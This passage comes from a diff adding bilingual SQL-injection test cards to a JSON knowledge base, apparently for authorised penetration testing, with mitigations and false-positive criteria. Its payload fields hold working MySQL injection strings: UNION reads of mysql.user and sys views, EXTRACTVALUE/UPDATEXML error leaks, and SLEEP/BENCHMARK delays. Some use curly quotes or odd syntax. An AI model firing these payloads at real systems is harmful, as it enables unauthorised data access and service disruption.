+        "en": "A positive result is input altering the backend pagination clause so the returned window exactly matches numbered markers and SQL auditing, beyond the parameter's legitimately allowed page or size semantics. Normal pagination, row drift from nondeterministic ordering, cache hits, syntax errors, or another dialect rejecting FETCH does not prove injection."
+      },
+      "opsecTips": [
+        {
+          "zh": "两个相邻受控窗口已证明边界可控后停止，不扩大 LIMIT 以导出完整数据集。",
+          "en": "Stop after two adjacent controlled windows prove that the boundary is controllable; do not enlarge LIMIT to export the full dataset."
+        },
+        {
+          "zh": "删除编号标记行，清除分页和响应缓存，并恢复页大小上限、排序白名单及参数绑定。",
+          "en": "Delete numbered marker rows, clear pagination and response caches, and restore page-size limits, sort allowlists, and parameter binding."
+        }
+      ],
+      "name": {
+        "zh": "行限制与分页子句注入",
+        "en": "Row-Limit and Pagination-Clause Injection"
+      },
+      "description": {
+        "zh": "覆盖 LIMIT/OFFSET 和 FETCH FIRST/NEXT 分页语法，验证输入能否控制返回行范围。",
+        "en": "Covers LIMIT/OFFSET and FETCH FIRST/NEXT pagination syntax to test whether input can control the returned row range."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "LIMIT/OFFSET/FETCH 注入",
+        "en": "LIMIT/OFFSET/FETCH Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "行限制与分页子句注入聚焦不同 DBMS 的分页语法不同；必须先匹配实际数据库，并确认用户页码或排序参数确实被拼入行限制位置。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Row-Limit and Pagination-Clause Injection focuses on this boundary: Pagination syntax differs by DBMS; match the actual database and confirm user page or sort input is concatenated into the row-limit position. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "开发者常假定 LIMIT/OFFSET 只接数字而直接拼接，忽略驱动绑定和服务端整数转换，导致输入可以改变结果窗口。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Developers often concatenate LIMIT or OFFSET assuming numeric input, overlooking driver binding and server-side integer conversion and allowing control of the result window. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "用合法页码记录对象 ID、排序和最大页大小，再提交两个方言正确的行窗口及一个越界负对照。 同一授权查询的返回行范围必须被输入稳定控制并对应最终 SQL；另一方言语法错误或正常翻页不构成注入。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Record object IDs, order, and maximum page size with valid pagination, then submit two dialect-correct row windows and one out-of-range negative control. Input must stably control the row range of the same authorized query and match final SQL; another dialect's syntax error or normal paging is not injection. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "将页码、大小和偏移解析为有界整数后绑定参数，排序字段使用允许列表，并在授权过滤后应用最大行数。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parse page, size, and offset as bounded integers before binding, allowlist sort fields, and apply maximum rows after authorization filtering. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "intermediate"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认LIMIT/OFFSET/FETCH 注入前置条件",
+            "en": "Confirm LIMIT/OFFSET/FETCH Injection prerequisites"
+          },
+          "description": {
+            "zh": "不同 DBMS 的分页语法不同；必须先匹配实际数据库，并确认用户页码或排序参数确实被拼入行限制位置。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Pagination syntax differs by DBMS; match the actual database and confirm user page or sort input is concatenated into the row-limit position. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控LIMIT/OFFSET/FETCH 注入探针",
+            "en": "Run a controlled LIMIT/OFFSET/FETCH Injection probe"
+          },
+          "description": {
+            "zh": "用合法页码记录对象 ID、排序和最大页大小，再提交两个方言正确的行窗口及一个越界负对照。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Record object IDs, order, and maximum page size with valid pagination, then submit two dialect-correct row windows and one out-of-range negative control. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ LIMIT 1 OFFSET 0--\n1’ LIMIT 0,1--\n1’ LIMIT 1 ROWS FETCH NEXT 1 ROWS ONLY--\n1’ FETCH FIRST 1 ROWS ONLY--"
+        },
+        {
+          "title": {
+            "zh": "核对LIMIT/OFFSET/FETCH 注入成功证据",
+            "en": "Verify LIMIT/OFFSET/FETCH Injection evidence"
+          },
+          "description": {
+            "zh": "同一授权查询的返回行范围必须被输入稳定控制并对应最终 SQL；另一方言语法错误或正常翻页不构成注入。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Input must stably control the row range of the same authorized query and match final SQL; another dialect's syntax error or normal paging is not injection. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归LIMIT/OFFSET/FETCH 注入",
+            "en": "Remediate and regress LIMIT/OFFSET/FETCH Injection"
+          },
+          "description": {
+            "zh": "将页码、大小和偏移解析为有界整数后绑定参数，排序字段使用允许列表，并在授权过滤后应用最大行数。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parse page, size, and offset as bounded integers before binding, allowlist sort fields, and apply maximum rows after authorization filtering. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://dev.mysql.com/doc/refman/8.4/en/select.html",
+        "https://www.postgresql.org/docs/current/queries-limit.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是分页语法位置的 SQL 载荷，不是数据库客户端命令参考。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-information-schema",
+      "prerequisites": [
+        {
+          "zh": "确认目标为兼容 MySQL 系统目录的数据库，并核对测试账户对 mysql、sys、performance_schema 的实际只读权限。",
+          "en": "Confirm a database with MySQL-compatible catalogs and verify the test account's actual read-only privileges on mysql, sys, and performance_schema."
+        },
+        {
+          "zh": "建立仅含随机名称的合成 schema、表或视图作为标记，不使用真实账户、生产表名或业务元数据。",
+          "en": "Create a synthetic schema, table, or view with a random name as the marker, without using real accounts, production table names, or business metadata."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求替代目录查询经已确认的注入点返回合成对象标记，并由数据库审计证实访问了对应目录；若主张黑名单绕过，还应显示 information_schema 形式被拦截。目录访问被拒绝、表不存在、WAF 放行但无标记、普通应用元数据或猜测到常见表名都是假阳性。",
+        "en": "Positive evidence requires an alternative-catalog query to return the synthetic object marker through the confirmed injection point, with database auditing showing access to that catalog; a blacklist-bypass claim should also show the information_schema form being blocked. Access denial, missing tables, WAF acceptance without a marker, ordinary application metadata, or guessing a common table name are false positives."
+      },
+      "opsecTips": [
+        {
+          "zh": "第一个合成目录标记返回后停止，不枚举 mysql.user、会话历史或生产 schema。",
+          "en": "Stop after the first synthetic catalog marker is returned; do not enumerate mysql.user, session history, or production schemas."
+        },
+        {
+          "zh": "删除合成对象，撤销临时目录权限，刷新元数据缓存并清理包含随机名称的查询记录。",
+          "en": "Drop synthetic objects, revoke temporary catalog grants, refresh metadata caches, and clear query records containing the random name."
+        }
+      ],
+      "name": {
+        "zh": "替代系统目录枚举注入",
+        "en": "Alternative System-Catalog Enumeration Injection"
+      },
+      "description": {
+        "zh": "使用 mysql、sys 和 performance_schema 的替代目录对象，验证仅屏蔽 information_schema 的不完整防护。",
+        "en": "Uses alternative catalog objects in mysql, sys, and performance_schema to test controls that block only information_schema."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "系统目录访问绕过",
+        "en": "System-Catalog Access Bypass"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "替代系统目录枚举注入聚焦阻断一个目录名不能修复 SQL 注入；测试应使用固定无敏感标记或权限结果，不枚举真实账户和结构。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Alternative System-Catalog Enumeration Injection focuses on this boundary: Blocking one catalog name does not fix SQL injection; use fixed non-sensitive markers or authorization results rather than enumerating real accounts and schema. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "查询仍被拼接且 WAF 只禁止 information_schema 时，其他系统视图可替代；过宽 SELECT 权限会扩大元数据泄露。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "When queries remain concatenated and a WAF bans only information_schema, alternative system views remain, and broad SELECT rights expand metadata disclosure. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "确认 MySQL 版本与业务账户权限，使用列数兼容的固定常量查询，对比单目录拦截和替代目录响应。 最终 SQL、数据库审计和受控标记必须一致；不同错误页、无权限响应或 WAF 放行本身都不能证明数据访问。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Confirm MySQL version and business-account privileges, use a column-compatible fixed-constant query, and compare the blocked catalog with an alternative. Final SQL, database auditing, and a controlled marker must agree; different error pages, denied access, or WAF passage alone do not prove data access. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询、允许列表映射动态表名，撤销业务账户对 mysql、sys 和 performance_schema 的非必需权限并监控跨模式读取。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries, allowlist dynamic table names, revoke unnecessary mysql, sys, and performance_schema access, and monitor cross-schema reads. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认系统目录访问绕过前置条件",
+            "en": "Confirm System-Catalog Access Bypass prerequisites"
+          },
+          "description": {
+            "zh": "阻断一个目录名不能修复 SQL 注入；测试应使用固定无敏感标记或权限结果，不枚举真实账户和结构。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Blocking one catalog name does not fix SQL injection; use fixed non-sensitive markers or authorization results rather than enumerating real accounts and schema. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控系统目录访问绕过探针",
+            "en": "Run a controlled System-Catalog Access Bypass probe"
+          },
+          "description": {
+            "zh": "确认 MySQL 版本与业务账户权限，使用列数兼容的固定常量查询，对比单目录拦截和替代目录响应。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Confirm MySQL version and business-account privileges, use a column-compatible fixed-constant query, and compare the blocked catalog with an alternative. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ UNION SELECT 1,2,3 FROM mysql.user--\n1’ UNION SELECT 1,2,3 FROM sys.schema_table_statistics--\n1’ UNION SELECT 1,2,3 FROM sys.x$schema_flattened_keys--\n1’ UNION SELECT 1,2,3 FROM performance_schema.events_statements_summary_by_digest--"
+        },
+        {
+          "title": {
+            "zh": "核对系统目录访问绕过成功证据",
+            "en": "Verify System-Catalog Access Bypass evidence"
+          },
+          "description": {
+            "zh": "最终 SQL、数据库审计和受控标记必须一致；不同错误页、无权限响应或 WAF 放行本身都不能证明数据访问。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Final SQL, database auditing, and a controlled marker must agree; different error pages, denied access, or WAF passage alone do not prove data access. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归系统目录访问绕过",
+            "en": "Remediate and regress System-Catalog Access Bypass"
+          },
+          "description": {
+            "zh": "参数化查询、允许列表映射动态表名，撤销业务账户对 mysql、sys 和 performance_schema 的非必需权限并监控跨模式读取。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries, allowlist dynamic table names, revoke unnecessary mysql, sys, and performance_schema access, and monitor cross-schema reads. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://dev.mysql.com/doc/refman/8.4/en/system-schema.html",
+        "https://dev.mysql.com/doc/refman/8.4/en/sys-schema.html",
+        "https://dev.mysql.com/doc/refman/8.4/en/performance-schema.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是系统目录黑名单缺口的注入载荷，不是元数据枚举工具说明。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-waf",
+      "prerequisites": [
+        {
+          "zh": "确认 MySQL 或兼容版本，并建立每个报错函数在该版本中是否可用、是否废弃的功能矩阵。",
+          "en": "Confirm the MySQL or compatible-server version and build a matrix showing which error functions are available or deprecated on that version."
+        },
+        {
+          "zh": "先用一个低风险固定表达式证明基础报错通道，再逐个替换函数，并采集 WAF 决策、数据库错误和应用脱敏结果。",
+          "en": "First prove the base error channel with one low-risk fixed expression, then substitute functions individually while collecting WAF decisions, database errors, and application redaction results."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性是某个版本兼容函数在规范形式被拦截时仍执行受控表达式，并让随机标记进入数据库错误通道，因果链可由 WAF 与数据库日志关联。函数不存在、参数类型错误、普通 500、错误页只显示函数名、或响应差异来自异常模板都属于假阳性。",
+        "en": "Positive evidence is a version-compatible function executing a controlled expression despite the canonical form being blocked and carrying a random marker into the database error channel, with WAF and database logs establishing causality. A missing function, argument-type error, generic 500, an error page showing only the function name, or response differences from an exception template are false positives."
+      },
+      "opsecTips": [
+        {
+          "zh": "一个函数变体成功传递随机标记后停止，不轮询整套函数或把用户、版本、目录值放入错误中。",
+          "en": "Stop after one function variant carries the random marker; do not cycle through the full set or place user, version, or catalog values in errors."
+        },
+        {
+          "zh": "恢复统一错误页和 WAF 测试策略，删除标记数据、请求追踪与详细数据库异常，并刷新应用错误缓存。",
+          "en": "Restore uniform error pages and WAF test policy, delete marker data, request traces, and verbose database exceptions, and refresh application error caches."
+        }
+      ],
+      "name": {
+        "zh": "MySQL 报错型注入的 WAF 变体",
+        "en": "WAF Variants for MySQL Error-Based Injection"
+      },
+      "description": {
+        "zh": "聚焦重复键、XML、GTID、JSON、地理与条件函数形成的报错或真假通道，验证 WAF 规则覆盖。",
+        "en": "Focuses on duplicate-key, XML, GTID, JSON, geospatial, and conditional function channels to test WAF coverage."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "报错注入 WAF 变体",
+        "en": "Error-Based Injection WAF Variants"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "MySQL 报错型注入的 WAF 变体聚焦不同函数提供同一报错证据通道，但可用性随 MySQL 版本变化；应先证明普通报错注入再逐个替换。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "WAF Variants for MySQL Error-Based Injection focuses on this boundary: Different functions provide the same error channel but availability changes by MySQL version; prove baseline error injection before substituting functions individually. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "WAF 只匹配固定函数而应用仍拼接 SQL 时，其他能产生异常或条件差异的函数可以绕过单一签名。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "If a WAF matches fixed functions while the application still concatenates SQL, other error-producing or conditional functions can evade the single signature. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "建立固定常量错误基线，再一次选择一个版本兼容函数并构造成功与失败条件，比较 WAF 和 MySQL 错误码。 数据库日志必须证明该函数到达后端并产生受控差异；函数不存在、统一错误页或只穿过 WAF 都不算绕过。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Establish a fixed-constant error baseline, choose one version-compatible function at a time with success and failure controls, and compare WAF and MySQL error codes. Database logs must prove the function reached the backend and caused the controlled difference; missing functions, generic errors, or merely passing the WAF are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询、统一对外错误并限制权限；WAF 以解析后的查询结构和异常行为补充检测，而不是维护函数黑名单。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries, normalize external errors, and reduce privileges; let the WAF detect parsed query structure and anomalous behavior rather than maintain a function blacklist. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认报错注入 WAF 变体前置条件",
+            "en": "Confirm Error-Based Injection WAF Variants prerequisites"
+          },
+          "description": {
+            "zh": "不同函数提供同一报错证据通道，但可用性随 MySQL 版本变化；应先证明普通报错注入再逐个替换。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Different functions provide the same error channel but availability changes by MySQL version; prove baseline error injection before substituting functions individually. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控报错注入 WAF 变体探针",
+            "en": "Run a controlled Error-Based Injection WAF Variants probe"
+          },
+          "description": {
+            "zh": "建立固定常量错误基线，再一次选择一个版本兼容函数并构造成功与失败条件，比较 WAF 和 MySQL 错误码。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Establish a fixed-constant error baseline, choose one version-compatible function at a time with success and failure controls, and compare WAF and MySQL error codes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n1’ AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--\n1’ AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--\n1’ AND GTID_SUBSET(version(),1)--\n1’ AND JSON_KEYS((SELECT CONCAT(0x7e,version())))--\n1’ AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,version())))--\n1’ AND ELT(1=1,1)--\n1’ AND MAKE_SET(1=1,1)--"
+        },
+        {
+          "title": {
+            "zh": "核对报错注入 WAF 变体成功证据",
+            "en": "Verify Error-Based Injection WAF Variants evidence"
+          },
+          "description": {
+            "zh": "数据库日志必须证明该函数到达后端并产生受控差异；函数不存在、统一错误页或只穿过 WAF 都不算绕过。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Database logs must prove the function reached the backend and caused the controlled difference; missing functions, generic errors, or merely passing the WAF are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归报错注入 WAF 变体",
+            "en": "Remediate and regress Error-Based Injection WAF Variants"
+          },
+          "description": {
+            "zh": "参数化查询、统一对外错误并限制权限；WAF 以解析后的查询结构和异常行为补充检测，而不是维护函数黑名单。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries, normalize external errors, and reduce privileges; let the WAF detect parsed query structure and anomalous behavior rather than maintain a function blacklist. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://dev.mysql.com/doc/refman/8.4/en/functions.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是 MySQL 报错函数注入变体，不是 WAF 扫描器或字典工具。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-waf-ext",
+      "prerequisites": [
+        {
+          "zh": "在确认的 MySQL 版本上验证 SLEEP、IF、BENCHMARK 与派生表语法，并限制测试账户的查询时间和并发。",
+          "en": "Verify SLEEP, IF, BENCHMARK, and derived-table syntax on the confirmed MySQL version, and cap query time and concurrency for the test account."
+        },
+        {
+          "zh": "建立低延迟恒真/恒假交错采样、正常网络抖动分布以及带连接标签的数据库会话观测。",
+          "en": "Establish low-delay interleaved true/false samples, a normal network-jitter distribution, and tagged database-session observability."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求某个嵌套变体相对恒假对照产生统计显著且可重放的延迟，并在数据库会话中看到相应函数执行；若声称 WAF 绕过，规范形式还必须被同一策略阻止。单次慢响应、BENCHMARK 的主机负载、锁竞争、连接池排队或 WAF 自身延迟均是假阳性。",
+        "en": "A positive result requires one nested variant to create a statistically significant, replayable delay versus the false control, with the corresponding function visible in database sessions; a WAF-bypass claim also requires the canonical form to be blocked by the same policy. One slow response, host load from BENCHMARK, lock contention, connection-pool queueing, or WAF latency is a false positive."
+      },
+      "opsecTips": [
+        {
+          "zh": "首个变体达到预设置信度后停止，禁止增加延时、BENCHMARK 次数或并行连接。",
+          "en": "Stop after the first variant reaches the predefined confidence level; do not increase delay, BENCHMARK iterations, or parallel connections."
+        },
+        {
+          "zh": "终止仍在 sleep/benchmark 的会话，排空测试连接池，恢复执行时限并删除 WAF 与性能采样记录。",
+          "en": "Terminate sessions still in sleep or benchmark, drain the test connection pool, restore execution limits, and delete WAF and performance-sampling records."
+        }
+      ],
+      "name": {
+        "zh": "MySQL 时间盲注的 WAF 变体",
+        "en": "WAF Variants for MySQL Time-Based Blind Injection"
+      },
+      "description": {
+        "zh": "使用派生表、SLEEP、IF 和 BENCHMARK 的不同表达式位置建立时间信号，验证 WAF 与 MySQL 解析差异。",
+        "en": "Uses derived tables, SLEEP, IF, and BENCHMARK in different expression positions to build timing signals and test WAF/MySQL parsing differences."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "时间盲注 WAF 变体",
+        "en": "Time-Based Blind Injection WAF Variants"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "MySQL 时间盲注的 WAF 变体聚焦变体改变延时函数的嵌套位置而非成功标准；必须以统计基线、真假分支和数据库会话共同证明。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "WAF Variants for MySQL Time-Based Blind Injection focuses on this boundary: Variants change delay-function nesting rather than the success criterion; prove them with a timing baseline, true/false branches, and database sessions together. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "拼接式 MySQL 表达式允许昂贵函数进入派生表或条件函数，固定位置签名无法覆盖等价嵌套，弱超时还会放大影响。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Concatenated MySQL expressions allow expensive functions in derived tables or conditionals, fixed-position signatures miss equivalent nesting, and weak timeouts amplify impact. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "交错采集正常、恒真和恒假短延时样本，每种嵌套只验证一次；BENCHMARK 仅用低迭代数观察趋势。 数据库会话或慢查询日志应只在恒真分支显示 SLEEP 或受控 BENCHMARK；网络慢响应和连接池等待必须排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Interleave normal, true, and false short-delay samples and validate each nesting once; use BENCHMARK only with low iterations to observe a trend. Database sessions or slow-query logs should show SLEEP or controlled BENCHMARK only for the true branch; exclude network slowness and pool waits. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询并设置语句超时、资源组与并发上限；统一解码后将异常函数结构作为 WAF 补充信号。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries and configure statement timeouts, resource groups, and concurrency limits; after canonical decoding, use anomalous function structure as a supplemental WAF signal. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认时间盲注 WAF 变体前置条件",
+            "en": "Confirm Time-Based Blind Injection WAF Variants prerequisites"
+          },
+          "description": {
+            "zh": "变体改变延时函数的嵌套位置而非成功标准；必须以统计基线、真假分支和数据库会话共同证明。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Variants change delay-function nesting rather than the success criterion; prove them with a timing baseline, true/false branches, and database sessions together. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控时间盲注 WAF 变体探针",
+            "en": "Run a controlled Time-Based Blind Injection WAF Variants probe"
+          },
+          "description": {
+            "zh": "交错采集正常、恒真和恒假短延时样本，每种嵌套只验证一次；BENCHMARK 仅用低迭代数观察趋势。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Interleave normal, true, and false short-delay samples and validate each nesting once; use BENCHMARK only with low iterations to observe a trend. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ AND (SELECT * FROM (SELECT(SLEEP(3)))a)--\n1’ AND SLEEP(3)--\n1’ OR (SELECT * FROM (SELECT(SLEEP(3)))a)--\n1’ OR SLEEP(3)--\n1’ AND IF(1=1,SLEEP(3),0)--\n1’ OR IF(1=1,SLEEP(3),0)--\n1’ AND BENCHMARK(10000000,SHA1(‘test’))--\n1’ SELECT SLEEP(3)--\n1’ SELECT IF(1=1,SLEEP(3),0)--\n1’ SELECT BENCHMARK(10000000,SHA1(‘test’))--"
+        },
+        {
+          "title": {
+            "zh": "核对时间盲注 WAF 变体成功证据",
+            "en": "Verify Time-Based Blind Injection WAF Variants evidence"
+          },
+          "description": {
+            "zh": "数据库会话或慢查询日志应只在恒真分支显示 SLEEP 或受控 BENCHMARK；网络慢响应和连接池等待必须排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Database sessions or slow-query logs should show SLEEP or controlled BENCHMARK only for the true branch; exclude network slowness and pool waits. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归时间盲注 WAF 变体",
+            "en": "Remediate and regress Time-Based Blind Injection WAF Variants"
+          },
+          "description": {
+            "zh": "参数化查询并设置语句超时、资源组与并发上限；统一解码后将异常函数结构作为 WAF 补充信号。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries and configure statement timeouts, resource groups, and concurrency limits; after canonical decoding, use anomalous function structure as a supplemental WAF signal. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html",
+        "https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这些是 MySQL 时间函数请求载荷，不应迁到 WAFW00F 或 SQLMap 工具卡。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-tricks-web-pentest-sql",
+      "prerequisites": [
+        {
+          "zh": "确认目标 DBMS 支持的引号与注释约定，并从应用查询或错误日志确定所需括号深度。",
+          "en": "Confirm the target DBMS's quote and comment conventions, and determine the required parenthesis depth from application query or error logs."
+        },
+        {
+          "zh": "对每个闭合候选只改变一个语法元素，并准备同一闭合下的恒真、恒假与正常请求三组样本。",
+          "en": "Change only one syntax element per closure candidate and prepare true, false, and normal samples under the same closure."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性证据是最小引号、括号和注释组合使恒真谓词恢复预期标记行，而恒假谓词稳定排除该行，后端查询记录同时显示闭合成功。两个分支都报错、两个分支都返回相同页面、注释符仅被回显、或一次状态码变化不属于布尔盲注证据。",
+        "en": "Positive evidence is the minimal quote, parenthesis, and comment combination restoring an expected marker row for the true predicate while the false predicate reproducibly excludes it, with backend query records showing successful closure. Both branches erroring, both returning the same page, a reflected comment token, or one status-code change is not Boolean-blind evidence."
+      },
+      "opsecTips": [
+        {
+          "zh": "确定一个最小闭合和一组真/假差异后停止，不继续增加括号、分号或替换注释风格。",
